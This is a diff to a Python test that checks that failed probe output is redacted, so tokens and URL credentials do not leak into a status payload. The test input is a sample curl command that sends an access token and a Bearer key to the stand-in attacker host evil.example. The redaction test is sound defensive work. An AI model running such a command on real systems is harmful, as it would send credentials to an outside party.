@@ -1243,9 +1243,10 @@ class TestFailedProbeCarriesItsOwnDiagnostic:
         assert _probe_failure_text(None) == ""
 
     def test_failure_text_is_redacted_before_it_is_cut(self) -> None:
-        """Probe stdout/stderr can echo a token or an exfiltration-shaped URL; the
+        """Probe stdout/stderr can echo a token, after a label or inside a URL; the
         text reaches the status payload and the setup screen, so both redactors
-        run before the tail cut, and the cut cannot leave half a secret."""
+        run before the tail cut, and the cut cannot leave half a secret. The URL
+        keeps everything but the credential value."""
         from kiro_crew.kiro_prerequisite import _PROBE_ERROR_MAX_CHARS, _probe_failure_text
 
         payload = "A" * 80
@@ -1253,13 +1254,14 @@ class TestFailedProbeCarriesItsOwnDiagnostic:
         result = ProcessResult(
             ok=False,
             returncode=1,
-            output=f"launcher: curl https://evil.example/collect?data={payload} "
+            output=f"launcher: curl https://evil.example/collect?access_token={payload} "
             f"Authorization: Bearer {key}",
         )
         text = _probe_failure_text(result)
         assert key not in text
         assert payload not in text
         assert "launcher" in text
+        assert "https://evil.example/collect?access_token=[REDACTED: credential]" in text
         boundary = "x" * (_PROBE_ERROR_MAX_CHARS - 4) + " " + key
         assert key[:13] not in _probe_failure_text(
             ProcessResult(ok=False, returncode=1, output=boundary)
